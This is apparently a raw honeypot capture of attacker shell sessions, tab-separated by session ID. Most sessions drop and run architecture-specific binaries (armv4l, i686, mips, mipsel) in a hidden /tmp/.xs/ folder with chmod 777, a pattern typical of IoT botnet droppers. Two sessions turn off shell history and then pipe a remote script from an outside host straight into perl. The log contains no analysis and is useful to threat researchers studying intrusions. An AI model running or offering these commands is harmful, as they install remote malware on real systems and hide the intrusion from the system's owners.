1a0f5616295b4f1686fb98ed2cf8d5cc	chmod 777 /tmp/.xs/test.mod
1a0f5616295b4f1686fb98ed2cf8d5cc	/tmp/.xs/test.mod
3dad5b5fd5e54c80aec28a834e794ae4	mkdir /tmp/.xs/
3dad5b5fd5e54c80aec28a834e794ae4	cat  > /tmp/.xs/daemon.armv4l.mod
3dad5b5fd5e54c80aec28a834e794ae4	chmod 777 /tmp/.xs/daemon.armv4l.mod
3dad5b5fd5e54c80aec28a834e794ae4	/tmp/.xs/daemon.armv4l.mod
39b69ebb59a14cf1a0a1851bbd01ff22	mkdir /tmp/.xs/
39b69ebb59a14cf1a0a1851bbd01ff22	cat  > /tmp/.xs/daemon.i686.mod
39b69ebb59a14cf1a0a1851bbd01ff22	chmod 777 /tmp/.xs/daemon.i686.mod
39b69ebb59a14cf1a0a1851bbd01ff22	/tmp/.xs/daemon.i686.mod
c16d0b7cc86947f68897f3901c9d3b95	mkdir /tmp/.xs/
c16d0b7cc86947f68897f3901c9d3b95	cat  > /tmp/.xs/daemon.mips.mod
c16d0b7cc86947f68897f3901c9d3b95	chmod 777 /tmp/.xs/daemon.mips.mod
c16d0b7cc86947f68897f3901c9d3b95	/tmp/.xs/daemon.mips.mod
11b49c2a2dbc4d019d85787896812ffb	mkdir /tmp/.xs/
11b49c2a2dbc4d019d85787896812ffb	cat  > /tmp/.xs/daemon.mipsel.mod
11b49c2a2dbc4d019d85787896812ffb	chmod 777 /tmp/.xs/daemon.mipsel.mod
11b49c2a2dbc4d019d85787896812ffb	/tmp/.xs/daemon.mipsel.mod
e8baa42e2ca941179fe6054489fe181d	mkdir /tmp/.xs/
e8baa42e2ca941179fe6054489fe181d	cat  > /tmp/.xs/test.mod
e8baa42e2ca941179fe6054489fe181d	chmod 777 /tmp/.xs/test.mod
e8baa42e2ca941179fe6054489fe181d	/tmp/.xs/test.mod
e990ac873e4e4753967f2f04a1e1708c	mkdir /tmp/.xs/
e990ac873e4e4753967f2f04a1e1708c	cat  > /tmp/.xs/daemon.armv4l.mod
e990ac873e4e4753967f2f04a1e1708c	chmod 777 /tmp/.xs/daemon.armv4l.mod
e990ac873e4e4753967f2f04a1e1708c	/tmp/.xs/daemon.armv4l.mod
fd9790194bac4a97aabb3d5907fdd1ca	mkdir /tmp/.xs/
fd9790194bac4a97aabb3d5907fdd1ca	cat  > /tmp/.xs/daemon.i686.mod
fd9790194bac4a97aabb3d5907fdd1ca	chmod 777 /tmp/.xs/daemon.i686.mod
fd9790194bac4a97aabb3d5907fdd1ca	/tmp/.xs/daemon.i686.mod
4239776fc40b4802b88f8618e1bf1d8b	mkdir /tmp/.xs/
4239776fc40b4802b88f8618e1bf1d8b	cat  > /tmp/.xs/daemon.mips.mod
4239776fc40b4802b88f8618e1bf1d8b	chmod 777 /tmp/.xs/daemon.mips.mod
4239776fc40b4802b88f8618e1bf1d8b	/tmp/.xs/daemon.mips.mod
3f8896f481054291bdcb7f7f46165670	mkdir /tmp/.xs/
3f8896f481054291bdcb7f7f46165670	cat  > /tmp/.xs/daemon.mipsel.mod
3f8896f481054291bdcb7f7f46165670	chmod 777 /tmp/.xs/daemon.mipsel.mod
3f8896f481054291bdcb7f7f46165670	/tmp/.xs/daemon.mipsel.mod
f301157adb8b4d65aa59cf860ae0d0df	mkdir /tmp/.xs/
f301157adb8b4d65aa59cf860ae0d0df	cat  > /tmp/.xs/test.mod
f301157adb8b4d65aa59cf860ae0d0df	chmod 777 /tmp/.xs/test.mod
f301157adb8b4d65aa59cf860ae0d0df	/tmp/.xs/test.mod
dd908acffddc4c60942b3f8f04882bb8	mkdir /tmp/.xs/
dd908acffddc4c60942b3f8f04882bb8	cat  > /tmp/.xs/daemon.armv4l.mod
dd908acffddc4c60942b3f8f04882bb8	chmod 777 /tmp/.xs/daemon.armv4l.mod
dd908acffddc4c60942b3f8f04882bb8	/tmp/.xs/daemon.armv4l.mod
1479baa05cfe40be95fa194261ec5132	mkdir /tmp/.xs/
1479baa05cfe40be95fa194261ec5132	cat  > /tmp/.xs/daemon.i686.mod
1479baa05cfe40be95fa194261ec5132	chmod 777 /tmp/.xs/daemon.i686.mod
1479baa05cfe40be95fa194261ec5132	/tmp/.xs/daemon.i686.mod
df40f0665f814f3691b67d367d7579a1	mkdir /tmp/.xs/
df40f0665f814f3691b67d367d7579a1	cat  > /tmp/.xs/daemon.mips.mod
df40f0665f814f3691b67d367d7579a1	chmod 777 /tmp/.xs/daemon.mips.mod
df40f0665f814f3691b67d367d7579a1	/tmp/.xs/daemon.mips.mod
3795a79f8bb24042aecf0574ad5e4ce8	mkdir /tmp/.xs/
3795a79f8bb24042aecf0574ad5e4ce8	cat  > /tmp/.xs/daemon.mipsel.mod
3795a79f8bb24042aecf0574ad5e4ce8	chmod 777 /tmp/.xs/daemon.mipsel.mod
3795a79f8bb24042aecf0574ad5e4ce8	/tmp/.xs/daemon.mipsel.mod
5b8a57ac90f24658a6a15a9cde5c8ab9	mkdir /tmp/.xs/
5b8a57ac90f24658a6a15a9cde5c8ab9	cat  > /tmp/.xs/test.mod
5b8a57ac90f24658a6a15a9cde5c8ab9	chmod 777 /tmp/.xs/test.mod
5b8a57ac90f24658a6a15a9cde5c8ab9	/tmp/.xs/test.mod
d2ae5ddedbc94f8b8ff885f1dae6e8ed	mkdir /tmp/.xs/
d2ae5ddedbc94f8b8ff885f1dae6e8ed	cat  > /tmp/.xs/daemon.armv4l.mod
d2ae5ddedbc94f8b8ff885f1dae6e8ed	chmod 777 /tmp/.xs/daemon.armv4l.mod
d2ae5ddedbc94f8b8ff885f1dae6e8ed	/tmp/.xs/daemon.armv4l.mod
61096aa655c641deb923aa9d5459e9e0	mkdir /tmp/.xs/
61096aa655c641deb923aa9d5459e9e0	cat  > /tmp/.xs/daemon.i686.mod
61096aa655c641deb923aa9d5459e9e0	chmod 777 /tmp/.xs/daemon.i686.mod
61096aa655c641deb923aa9d5459e9e0	/tmp/.xs/daemon.i686.mod
e6330e8ffe1f4b37833766f5c2fb9183	mkdir /tmp/.xs/
e6330e8ffe1f4b37833766f5c2fb9183	cat  > /tmp/.xs/daemon.mips.mod
e6330e8ffe1f4b37833766f5c2fb9183	chmod 777 /tmp/.xs/daemon.mips.mod
e6330e8ffe1f4b37833766f5c2fb9183	/tmp/.xs/daemon.mips.mod
ac332f56987c4c5eb037c408190d87a2	mkdir /tmp/.xs/
ac332f56987c4c5eb037c408190d87a2	cat  > /tmp/.xs/daemon.mipsel.mod
ac332f56987c4c5eb037c408190d87a2	chmod 777 /tmp/.xs/daemon.mipsel.mod
ac332f56987c4c5eb037c408190d87a2	/tmp/.xs/daemon.mipsel.mod
124c251ab8c843ffb5da80130855fa91	mkdir /tmp/.xs/
124c251ab8c843ffb5da80130855fa91	cat  > /tmp/.xs/test.mod
124c251ab8c843ffb5da80130855fa91	chmod 777 /tmp/.xs/test.mod
124c251ab8c843ffb5da80130855fa91	/tmp/.xs/test.mod
d332e9b7b28b4cf9923c82e02442e600	mkdir /tmp/.xs/
d332e9b7b28b4cf9923c82e02442e600	cat  > /tmp/.xs/daemon.armv4l.mod
d332e9b7b28b4cf9923c82e02442e600	chmod 777 /tmp/.xs/daemon.armv4l.mod
d332e9b7b28b4cf9923c82e02442e600	/tmp/.xs/daemon.armv4l.mod
2ff2bfd2021d44828625096816fe11a2	mkdir /tmp/.xs/
2ff2bfd2021d44828625096816fe11a2	cat  > /tmp/.xs/daemon.i686.mod
2ff2bfd2021d44828625096816fe11a2	chmod 777 /tmp/.xs/daemon.i686.mod
2ff2bfd2021d44828625096816fe11a2	/tmp/.xs/daemon.i686.mod
a75106e4ba6046dca64ea8480b33a8ef	mkdir /tmp/.xs/
a75106e4ba6046dca64ea8480b33a8ef	cat  > /tmp/.xs/daemon.mips.mod
a75106e4ba6046dca64ea8480b33a8ef	chmod 777 /tmp/.xs/daemon.mips.mod
a75106e4ba6046dca64ea8480b33a8ef	/tmp/.xs/daemon.mips.mod
b3092ba6cf2e4ceb94a3e9e17546a1fe	mkdir /tmp/.xs/
b3092ba6cf2e4ceb94a3e9e17546a1fe	cat  > /tmp/.xs/daemon.armv4l.mod
b3092ba6cf2e4ceb94a3e9e17546a1fe	chmod 777 /tmp/.xs/daemon.armv4l.mod
b3092ba6cf2e4ceb94a3e9e17546a1fe	/tmp/.xs/daemon.armv4l.mod
551dda63fad3455eb3b1437e62cf931a	mkdir /tmp/.xs/
551dda63fad3455eb3b1437e62cf931a	cat  > /tmp/.xs/daemon.i686.mod
551dda63fad3455eb3b1437e62cf931a	chmod 777 /tmp/.xs/daemon.i686.mod
551dda63fad3455eb3b1437e62cf931a	/tmp/.xs/daemon.i686.mod
c5479bdba273498da0ca457f60c17f9b	mkdir /tmp/.xs/
c5479bdba273498da0ca457f60c17f9b	cat  > /tmp/.xs/daemon.mips.mod
c5479bdba273498da0ca457f60c17f9b	chmod 777 /tmp/.xs/daemon.mips.mod
c5479bdba273498da0ca457f60c17f9b	/tmp/.xs/daemon.mips.mod
24747406f3b94763abafcaad9aa5de48	mkdir /tmp/.xs/
24747406f3b94763abafcaad9aa5de48	cat  > /tmp/.xs/daemon.mipsel.mod
24747406f3b94763abafcaad9aa5de48	chmod 777 /tmp/.xs/daemon.mipsel.mod
24747406f3b94763abafcaad9aa5de48	/tmp/.xs/daemon.mipsel.mod
8693abd3f34b4d34865d16ea4d04a090	mkdir /tmp/.xs/
8693abd3f34b4d34865d16ea4d04a090	cat  > /tmp/.xs/test.mod
8693abd3f34b4d34865d16ea4d04a090	chmod 777 /tmp/.xs/test.mod
8693abd3f34b4d34865d16ea4d04a090	/tmp/.xs/test.mod
9ad2afcb2f3d43b7a7e415dd05bcbfca	mkdir /tmp/.xs/
9ad2afcb2f3d43b7a7e415dd05bcbfca	cat  > /tmp/.xs/daemon.armv4l.mod
9ad2afcb2f3d43b7a7e415dd05bcbfca	chmod 777 /tmp/.xs/daemon.armv4l.mod
9ad2afcb2f3d43b7a7e415dd05bcbfca	/tmp/.xs/daemon.armv4l.mod
9a6287ac172047b183098680fba7485b	mkdir /tmp/.xs/
9a6287ac172047b183098680fba7485b	cat  > /tmp/.xs/daemon.i686.mod
9a6287ac172047b183098680fba7485b	chmod 777 /tmp/.xs/daemon.i686.mod
9a6287ac172047b183098680fba7485b	/tmp/.xs/daemon.i686.mod
d2755faca89f411fb3a433d14913e1fd	mkdir /tmp/.xs/
d2755faca89f411fb3a433d14913e1fd	cat  > /tmp/.xs/daemon.mips.mod
d2755faca89f411fb3a433d14913e1fd	chmod 777 /tmp/.xs/daemon.mips.mod
d2755faca89f411fb3a433d14913e1fd	/tmp/.xs/daemon.mips.mod
8f155cafb8534aa99ba0e5339af1e440	mkdir /tmp/.xs/
8f155cafb8534aa99ba0e5339af1e440	cat  > /tmp/.xs/daemon.mipsel.mod
8f155cafb8534aa99ba0e5339af1e440	chmod 777 /tmp/.xs/daemon.mipsel.mod
8f155cafb8534aa99ba0e5339af1e440	/tmp/.xs/daemon.mipsel.mod
d02b0c9705ea43e984fc7e5e7d4cda19	mkdir /tmp/.xs/
d02b0c9705ea43e984fc7e5e7d4cda19	cat  > /tmp/.xs/test.mod
d02b0c9705ea43e984fc7e5e7d4cda19	chmod 777 /tmp/.xs/test.mod
d02b0c9705ea43e984fc7e5e7d4cda19	/tmp/.xs/test.mod
41afd45444b248dea8cc215f7693ab96	mkdir /tmp/.xs/
41afd45444b248dea8cc215f7693ab96	cat  > /tmp/.xs/daemon.armv4l.mod
41afd45444b248dea8cc215f7693ab96	chmod 777 /tmp/.xs/daemon.armv4l.mod
41afd45444b248dea8cc215f7693ab96	/tmp/.xs/daemon.armv4l.mod
ecc059fbcf404a4483bd1ddde1918808	mkdir /tmp/.xs/
ecc059fbcf404a4483bd1ddde1918808	cat  > /tmp/.xs/daemon.i686.mod
ecc059fbcf404a4483bd1ddde1918808	chmod 777 /tmp/.xs/daemon.i686.mod
ecc059fbcf404a4483bd1ddde1918808	/tmp/.xs/daemon.i686.mod
9adaca8276a647b7afe0e815544233d1	mkdir /tmp/.xs/
9adaca8276a647b7afe0e815544233d1	cat  > /tmp/.xs/daemon.mips.mod
9adaca8276a647b7afe0e815544233d1	chmod 777 /tmp/.xs/daemon.mips.mod
9adaca8276a647b7afe0e815544233d1	/tmp/.xs/daemon.mips.mod
484514ab7356427083471dfe88bd1517	mkdir /tmp/.xs/
484514ab7356427083471dfe88bd1517	cat  > /tmp/.xs/daemon.mipsel.mod
484514ab7356427083471dfe88bd1517	chmod 777 /tmp/.xs/daemon.mipsel.mod
484514ab7356427083471dfe88bd1517	/tmp/.xs/daemon.mipsel.mod
dd7bb992b8ab4d08b672489e99b172ff	mkdir /tmp/.xs/
dd7bb992b8ab4d08b672489e99b172ff	cat  > /tmp/.xs/test.mod
dd7bb992b8ab4d08b672489e99b172ff	chmod 777 /tmp/.xs/test.mod
dd7bb992b8ab4d08b672489e99b172ff	/tmp/.xs/test.mod
48a33167fe824c2eb51b787e633b7b2a	mkdir /tmp/.xs/
48a33167fe824c2eb51b787e633b7b2a	cat  > /tmp/.xs/daemon.armv4l.mod
48a33167fe824c2eb51b787e633b7b2a	chmod 777 /tmp/.xs/daemon.armv4l.mod
48a33167fe824c2eb51b787e633b7b2a	/tmp/.xs/daemon.armv4l.mod
16393d10b1074b5a86e6b41cedc7519d	mkdir /tmp/.xs/
16393d10b1074b5a86e6b41cedc7519d	cat  > /tmp/.xs/daemon.i686.mod
16393d10b1074b5a86e6b41cedc7519d	chmod 777 /tmp/.xs/daemon.i686.mod
16393d10b1074b5a86e6b41cedc7519d	/tmp/.xs/daemon.i686.mod
c1d72460a418473d949a64b03eaf6bb0	mkdir /tmp/.xs/
c1d72460a418473d949a64b03eaf6bb0	cat  > /tmp/.xs/daemon.mips.mod
c1d72460a418473d949a64b03eaf6bb0	chmod 777 /tmp/.xs/daemon.mips.mod
c1d72460a418473d949a64b03eaf6bb0	/tmp/.xs/daemon.mips.mod
b5edd90b6ee5494f92af6019e0931f0d	mkdir /tmp/.xs/
b5edd90b6ee5494f92af6019e0931f0d	cat  > /tmp/.xs/daemon.mipsel.mod
b5edd90b6ee5494f92af6019e0931f0d	chmod 777 /tmp/.xs/daemon.mipsel.mod
b5edd90b6ee5494f92af6019e0931f0d	/tmp/.xs/daemon.mipsel.mod
e46a22284e534a5ca657c0610a8e2f64	mkdir /tmp/.xs/
e46a22284e534a5ca657c0610a8e2f64	cat  > /tmp/.xs/test.mod
e46a22284e534a5ca657c0610a8e2f64	chmod 777 /tmp/.xs/test.mod
e46a22284e534a5ca657c0610a8e2f64	/tmp/.xs/test.mod
0479108ff75b4b47a258d7e7105a9608	mkdir /tmp/.xs/
0479108ff75b4b47a258d7e7105a9608	cat  > /tmp/.xs/daemon.armv4l.mod
0479108ff75b4b47a258d7e7105a9608	chmod 777 /tmp/.xs/daemon.armv4l.mod
0479108ff75b4b47a258d7e7105a9608	/tmp/.xs/daemon.armv4l.mod
655e2151b0fc47fcb6d0a43e48cee287	mkdir /tmp/.xs/
655e2151b0fc47fcb6d0a43e48cee287	cat  > /tmp/.xs/daemon.i686.mod
655e2151b0fc47fcb6d0a43e48cee287	chmod 777 /tmp/.xs/daemon.i686.mod
655e2151b0fc47fcb6d0a43e48cee287	/tmp/.xs/daemon.i686.mod
34155eee4ed74339b7753e3a73ae619f	mkdir /tmp/.xs/
34155eee4ed74339b7753e3a73ae619f	cat  > /tmp/.xs/daemon.mips.mod
34155eee4ed74339b7753e3a73ae619f	chmod 777 /tmp/.xs/daemon.mips.mod
34155eee4ed74339b7753e3a73ae619f	/tmp/.xs/daemon.mips.mod
b50074ba15d349a6826abdb0be894ae8	mkdir /tmp/.xs/
b50074ba15d349a6826abdb0be894ae8	cat  > /tmp/.xs/daemon.mipsel.mod
b50074ba15d349a6826abdb0be894ae8	chmod 777 /tmp/.xs/daemon.mipsel.mod
b50074ba15d349a6826abdb0be894ae8	/tmp/.xs/daemon.mipsel.mod
4a97c9fd625245528ae593d4191ef5f3	mkdir /tmp/.xs/
4a97c9fd625245528ae593d4191ef5f3	cat  > /tmp/.xs/test.mod
4a97c9fd625245528ae593d4191ef5f3	chmod 777 /tmp/.xs/test.mod
4a97c9fd625245528ae593d4191ef5f3	/tmp/.xs/test.mod
887a05079ab34df9bc11f8e545a5bc8d	echo -n test
887a05079ab34df9bc11f8e545a5bc8d	cat /proc/version
d892f8405df6435c8f6e9e4a397f0654	mkdir /tmp/.xs/
d892f8405df6435c8f6e9e4a397f0654	cat  > /tmp/.xs/daemon.armv4l.mod
d892f8405df6435c8f6e9e4a397f0654	chmod 777 /tmp/.xs/daemon.armv4l.mod
d892f8405df6435c8f6e9e4a397f0654	/tmp/.xs/daemon.armv4l.mod
c999a775955149ce8f03994b2cf43b49	mkdir /tmp/.xs/
c999a775955149ce8f03994b2cf43b49	cat  > /tmp/.xs/daemon.i686.mod
c999a775955149ce8f03994b2cf43b49	chmod 777 /tmp/.xs/daemon.i686.mod
c999a775955149ce8f03994b2cf43b49	/tmp/.xs/daemon.i686.mod
dc59c9d383b143bebcef56a36310563d	mkdir /tmp/.xs/
dc59c9d383b143bebcef56a36310563d	cat  > /tmp/.xs/daemon.mips.mod
dc59c9d383b143bebcef56a36310563d	chmod 777 /tmp/.xs/daemon.mips.mod
dc59c9d383b143bebcef56a36310563d	/tmp/.xs/daemon.mips.mod
c99b9471da034976805cef1d20c81cd4	mkdir /tmp/.xs/
c99b9471da034976805cef1d20c81cd4	cat  > /tmp/.xs/daemon.mipsel.mod
c99b9471da034976805cef1d20c81cd4	chmod 777 /tmp/.xs/daemon.mipsel.mod
c99b9471da034976805cef1d20c81cd4	/tmp/.xs/daemon.mipsel.mod
7d8e0967760d472ea064596fda1a9624	set +o history
7d8e0967760d472ea064596fda1a9624	wget -qO - http://musti.be/lul  |  perl
0e9732d53e9d4c228d688691742ad524	set +o history
0e9732d53e9d4c228d688691742ad524	wget -qO - http://musti.be/lul  |  perl
7d8e0967760d472ea064596fda1a9624	exit
0e9732d53e9d4c228d688691742ad524	exit
112d4ed259a445f38dd7a9874928c9b6	mkdir /tmp/.xs/
112d4ed259a445f38dd7a9874928c9b6	cat  > /tmp/.xs/daemon.armv4l.mod
112d4ed259a445f38dd7a9874928c9b6	chmod 777 /tmp/.xs/daemon.armv4l.mod
112d4ed259a445f38dd7a9874928c9b6	/tmp/.xs/daemon.armv4l.mod
734210d13d8e4943be21f2e70b48e707	mkdir /tmp/.xs/
734210d13d8e4943be21f2e70b48e707	cat  > /tmp/.xs/daemon.i686.mod
734210d13d8e4943be21f2e70b48e707	chmod 777 /tmp/.xs/daemon.i686.mod
734210d13d8e4943be21f2e70b48e707	/tmp/.xs/daemon.i686.mod
2b622c5ad2f44c9587cd85c9319090db	mkdir /tmp/.xs/
2b622c5ad2f44c9587cd85c9319090db	cat  > /tmp/.xs/daemon.mips.mod
2b622c5ad2f44c9587cd85c9319090db	chmod 777 /tmp/.xs/daemon.mips.mod
2b622c5ad2f44c9587cd85c9319090db	/tmp/.xs/daemon.mips.mod
e80c11662580415390e1f07faa124d8d	mkdir /tmp/.xs/
e80c11662580415390e1f07faa124d8d	cat  > /tmp/.xs/daemon.mipsel.mod
e80c11662580415390e1f07faa124d8d	chmod 777 /tmp/.xs/daemon.mipsel.mod
e80c11662580415390e1f07faa124d8d	/tmp/.xs/daemon.mipsel.mod
5c1a501acda745c596313031711f7e81	mkdir /tmp/.xs/
5c1a501acda745c596313031711f7e81	cat  > /tmp/.xs/test.mod
5c1a501acda745c596313031711f7e81	chmod 777 /tmp/.xs/test.mod
5c1a501acda745c596313031711f7e81	/tmp/.xs/test.mod
f301a70519764213b67ca540ff9c9d00	mkdir /tmp/.xs/
f301a70519764213b67ca540ff9c9d00	cat  > /tmp/.xs/daemon.armv4l.mod
f301a70519764213b67ca540ff9c9d00	chmod 777 /tmp/.xs/daemon.armv4l.mod
f301a70519764213b67ca540ff9c9d00	/tmp/.xs/daemon.armv4l.mod
cf4c48b94322446fbf560259ce5e03ee	mkdir /tmp/.xs/
cf4c48b94322446fbf560259ce5e03ee	cat  > /tmp/.xs/daemon.i686.mod
cf4c48b94322446fbf560259ce5e03ee	chmod 777 /tmp/.xs/daemon.i686.mod
cf4c48b94322446fbf560259ce5e03ee	/tmp/.xs/daemon.i686.mod
b692214859a247e2b02d07d14259e5bc	mkdir /tmp/.xs/
b692214859a247e2b02d07d14259e5bc	cat  > /tmp/.xs/daemon.mips.mod
b692214859a247e2b02d07d14259e5bc	chmod 777 /tmp/.xs/daemon.mips.mod
b692214859a247e2b02d07d14259e5bc	/tmp/.xs/daemon.mips.mod
5240700969664644a35215bcb840a924	mkdir /tmp/.xs/
5240700969664644a35215bcb840a924	cat  > /tmp/.xs/daemon.mipsel.mod
5240700969664644a35215bcb840a924	chmod 777 /tmp/.xs/daemon.mipsel.mod
5240700969664644a35215bcb840a924	/tmp/.xs/daemon.mipsel.mod
5eb2f9d630474a3a9ff09d74f2e34bad	mkdir /tmp/.xs/
5eb2f9d630474a3a9ff09d74f2e34bad	cat  > /tmp/.xs/test.mod
5eb2f9d630474a3a9ff09d74f2e34bad	chmod 777 /tmp/.xs/test.mod
5eb2f9d630474a3a9ff09d74f2e34bad	/tmp/.xs/test.mod
73598c5ce37b4b798e020036748b844b	mkdir /tmp/.xs/
73598c5ce37b4b798e020036748b844b	cat  > /tmp/.xs/daemon.armv4l.mod
73598c5ce37b4b798e020036748b844b	chmod 777 /tmp/.xs/daemon.armv4l.mod
73598c5ce37b4b798e020036748b844b	/tmp/.xs/daemon.armv4l.mod
a89cd2bebf314ce593a0d4280ad80c73	mkdir /tmp/.xs/
a89cd2bebf314ce593a0d4280ad80c73	cat  > /tmp/.xs/daemon.i686.mod
a89cd2bebf314ce593a0d4280ad80c73	chmod 777 /tmp/.xs/daemon.i686.mod
a89cd2bebf314ce593a0d4280ad80c73	/tmp/.xs/daemon.i686.mod
47ec94234b754d51b3665b62f52497d8	mkdir /tmp/.xs/
47ec94234b754d51b3665b62f52497d8	cat  > /tmp/.xs/daemon.mips.mod
47ec94234b754d51b3665b62f52497d8	chmod 777 /tmp/.xs/daemon.mips.mod
47ec94234b754d51b3665b62f52497d8	/tmp/.xs/daemon.mips.mod
f069625b845841f2a84ac5ec2e82e128	mkdir /tmp/.xs/
f069625b845841f2a84ac5ec2e82e128	cat  > /tmp/.xs/daemon.mipsel.mod
f069625b845841f2a84ac5ec2e82e128	chmod 777 /tmp/.xs/daemon.mipsel.mod
f069625b845841f2a84ac5ec2e82e128	/tmp/.xs/daemon.mipsel.mod
818597982fff4f75b654f606944bbbb2	mkdir /tmp/.xs/
818597982fff4f75b654f606944bbbb2	cat  > /tmp/.xs/test.mod
818597982fff4f75b654f606944bbbb2	chmod 777 /tmp/.xs/test.mod
818597982fff4f75b654f606944bbbb2	/tmp/.xs/test.mod
a9b3836dd183489d87c9ae830f35bdc5	mkdir /tmp/.xs/
a9b3836dd183489d87c9ae830f35bdc5	cat  > /tmp/.xs/daemon.armv4l.mod
a9b3836dd183489d87c9ae830f35bdc5	chmod 777 /tmp/.xs/daemon.armv4l.mod
a9b3836dd183489d87c9ae830f35bdc5	/tmp/.xs/daemon.armv4l.mod
4b6cbd1b541540f589e0aedc47c8675c	mkdir /tmp/.xs/
4b6cbd1b541540f589e0aedc47c8675c	cat  > /tmp/.xs/daemon.i686.mod
4b6cbd1b541540f589e0aedc47c8675c	chmod 777 /tmp/.xs/daemon.i686.mod
4b6cbd1b541540f589e0aedc47c8675c	/tmp/.xs/daemon.i686.mod
b531045156044cf4b0b1eaff3ac1e91a	mkdir /tmp/.xs/
b531045156044cf4b0b1eaff3ac1e91a	cat  > /tmp/.xs/daemon.mips.mod
b531045156044cf4b0b1eaff3ac1e91a	chmod 777 /tmp/.xs/daemon.mips.mod
b531045156044cf4b0b1eaff3ac1e91a	/tmp/.xs/daemon.mips.mod
01dc7829e307436f82d2e2d1ebe25b5e	mkdir /tmp/.xs/
01dc7829e307436f82d2e2d1ebe25b5e	cat  > /tmp/.xs/daemon.mipsel.mod
01dc7829e307436f82d2e2d1ebe25b5e	chmod 777 /tmp/.xs/daemon.mipsel.mod
01dc7829e307436f82d2e2d1ebe25b5e	/tmp/.xs/daemon.mipsel.mod
535b5ca92e5144ae827889a2635f8baa	mkdir /tmp/.xs/
535b5ca92e5144ae827889a2635f8baa	cat  > /tmp/.xs/test.mod
535b5ca92e5144ae827889a2635f8baa	chmod 777 /tmp/.xs/test.mod
535b5ca92e5144ae827889a2635f8baa	/tmp/.xs/test.mod
a17678274467491ba915fe875d34b339	mkdir /tmp/.xs/
a17678274467491ba915fe875d34b339	cat  > /tmp/.xs/daemon.armv4l.mod
a17678274467491ba915fe875d34b339	chmod 777 /tmp/.xs/daemon.armv4l.mod
a17678274467491ba915fe875d34b339	/tmp/.xs/daemon.armv4l.mod
41414f9941b041ea8512c6e50fd8171c	mkdir /tmp/.xs/
41414f9941b041ea8512c6e50fd8171c	cat  > /tmp/.xs/daemon.i686.mod
41414f9941b041ea8512c6e50fd8171c	chmod 777 /tmp/.xs/daemon.i686.mod
41414f9941b041ea8512c6e50fd8171c	/tmp/.xs/daemon.i686.mod
e1f68318e0b6495da784284a22501f74	mkdir /tmp/.xs/
e1f68318e0b6495da784284a22501f74	cat  > /tmp/.xs/daemon.mips.mod
e1f68318e0b6495da784284a22501f74	chmod 777 /tmp/.xs/daemon.mips.mod
e1f68318e0b6495da784284a22501f74	/tmp/.xs/daemon.mips.mod
a61620c18ff64e6a9a9940f58ef4a1f5	mkdir /tmp/.xs/
a61620c18ff64e6a9a9940f58ef4a1f5	cat  > /tmp/.xs/daemon.mipsel.mod
a61620c18ff64e6a9a9940f58ef4a1f5	chmod 777 /tmp/.xs/daemon.mipsel.mod
a61620c18ff64e6a9a9940f58ef4a1f5	/tmp/.xs/daemon.mipsel.mod
bbdc0f1ce7b1409eaecb2b166a2f7b7e	mkdir /tmp/.xs/
bbdc0f1ce7b1409eaecb2b166a2f7b7e	cat  > /tmp/.xs/test.mod
bbdc0f1ce7b1409eaecb2b166a2f7b7e	chmod 777 /tmp/.xs/test.mod
bbdc0f1ce7b1409eaecb2b166a2f7b7e	/tmp/.xs/test.mod
537b412079af45dbad2e06ff6d233f08	mkdir /tmp/.xs/
537b412079af45dbad2e06ff6d233f08	cat  > /tmp/.xs/daemon.armv4l.mod
537b412079af45dbad2e06ff6d233f08	chmod 777 /tmp/.xs/daemon.armv4l.mod
537b412079af45dbad2e06ff6d233f08	/tmp/.xs/daemon.armv4l.mod
85858668f58d42eeb01c2478541fd583	mkdir /tmp/.xs/
85858668f58d42eeb01c2478541fd583	cat  > /tmp/.xs/daemon.i686.mod
85858668f58d42eeb01c2478541fd583	chmod 777 /tmp/.xs/daemon.i686.mod
85858668f58d42eeb01c2478541fd583	/tmp/.xs/daemon.i686.mod
56b2573f33504136a1659aa582ddb0e0	mkdir /tmp/.xs/
56b2573f33504136a1659aa582ddb0e0	cat  > /tmp/.xs/daemon.mips.mod
56b2573f33504136a1659aa582ddb0e0	chmod 777 /tmp/.xs/daemon.mips.mod
56b2573f33504136a1659aa582ddb0e0	/tmp/.xs/daemon.mips.mod
42621d5f5fbb4d7ebdc1f6fb9ce085d8	mkdir /tmp/.xs/
42621d5f5fbb4d7ebdc1f6fb9ce085d8	cat  > /tmp/.xs/daemon.mipsel.mod
42621d5f5fbb4d7ebdc1f6fb9ce085d8	chmod 777 /tmp/.xs/daemon.mipsel.mod
42621d5f5fbb4d7ebdc1f6fb9ce085d8	/tmp/.xs/daemon.mipsel.mod
cfdbf94ca64447dbbc910133a630bf39	mkdir /tmp/.xs/
